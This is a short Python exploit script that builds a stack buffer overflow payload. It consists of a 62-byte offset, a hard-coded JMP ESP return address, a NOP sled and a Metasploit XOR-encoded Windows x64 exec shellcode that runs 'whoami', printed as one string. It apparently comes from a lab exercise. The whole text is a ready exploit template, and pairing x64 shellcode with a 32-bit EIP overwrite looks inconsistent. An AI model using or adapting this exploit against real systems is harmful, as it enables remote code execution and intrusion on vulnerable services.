# Offset buffer
buffer = "A" * 62
#JMP ESP address, from find /b, little endian
EIP = '\xaf\x11\x50\x62'

# 0x625011af

# NOP sled
nop = '\x90' * 10

# windows/x64/exec - 324 bytes
# https://metasploit.com/
# Encoder: x64/xor_dynamic
# VERBOSE=false, PrependMigrate=false, EXITFUNC=process, 
# CMD=whoami
buf =  b""
buf += b"\xeb\x27\x5b\x53\x5f\xb0\x26\xfc\xae\x75\xfd\x57"
buf += b"\x59\x53\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff"
buf += b"\xc6\x66\x81\x3f\xee\x29\x74\x07\x80\x3e\x26\x75"
buf += b"\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff\xff\x10\x26"
buf += b"\xec\x58\x93\xf4\xe0\xf8\xd0\x10\x10\x10\x51\x41"
buf += b"\x51\x40\x42\x41\x46\x58\x21\xc2\x75\x58\x9b\x42"
buf += b"\x70\x58\x9b\x42\x08\x58\x9b\x42\x30\x58\x9b\x62"
buf += b"\x40\x58\x1f\xa7\x5a\x5a\x5d\x21\xd9\x58\x21\xd0"
buf += b"\xbc\x2c\x71\x6c\x12\x3c\x30\x51\xd1\xd9\x1d\x51"
buf += b"\x11\xd1\xf2\xfd\x42\x51\x41\x58\x9b\x42\x30\x9b"
buf += b"\x52\x2c\x58\x11\xc0\x9b\x90\x98\x10\x10\x10\x58"
buf += b"\x95\xd0\x64\x77\x58\x11\xc0\x40\x9b\x58\x08\x54"
buf += b"\x9b\x50\x30\x59\x11\xc0\xf3\x46\x58\xef\xd9\x51"
buf += b"\x9b\x24\x98\x58\x11\xc6\x5d\x21\xd9\x58\x21\xd0"
buf += b"\xbc\x51\xd1\xd9\x1d\x51\x11\xd1\x28\xf0\x65\xe1"
buf += b"\x5c\x13\x5c\x34\x18\x55\x29\xc1\x65\xc8\x48\x54"
buf += b"\x9b\x50\x34\x59\x11\xc0\x76\x51\x9b\x1c\x58\x54"
buf += b"\x9b\x50\x0c\x59\x11\xc0\x51\x9b\x14\x98\x58\x11"
buf += b"\xc0\x51\x48\x51\x48\x4e\x49\x4a\x51\x48\x51\x49"
buf += b"\x51\x4a\x58\x93\xfc\x30\x51\x42\xef\xf0\x48\x51"
buf += b"\x49\x4a\x58\x9b\x02\xf9\x47\xef\xef\xef\x4d\x58"
buf += b"\xaa\x11\x10\x10\x10\x10\x10\x10\x10\x58\x9d\x9d"
buf += b"\x11\x11\x10\x10\x51\xaa\x21\x9b\x7f\x97\xef\xc5"
buf += b"\xab\xe0\xa5\xb2\x46\x51\xaa\xb6\x85\xad\x8d\xef"
buf += b"\xc5\x58\x93\xd4\x38\x2c\x16\x6c\x1a\x90\xeb\xf0"
buf += b"\x65\x15\xab\x57\x03\x62\x7f\x7a\x10\x49\x51\x99"
buf += b"\xca\xef\xc5\x67\x78\x7f\x71\x7d\x79\x10\xee\x29"

print(buffer + EIP + nop + buf)

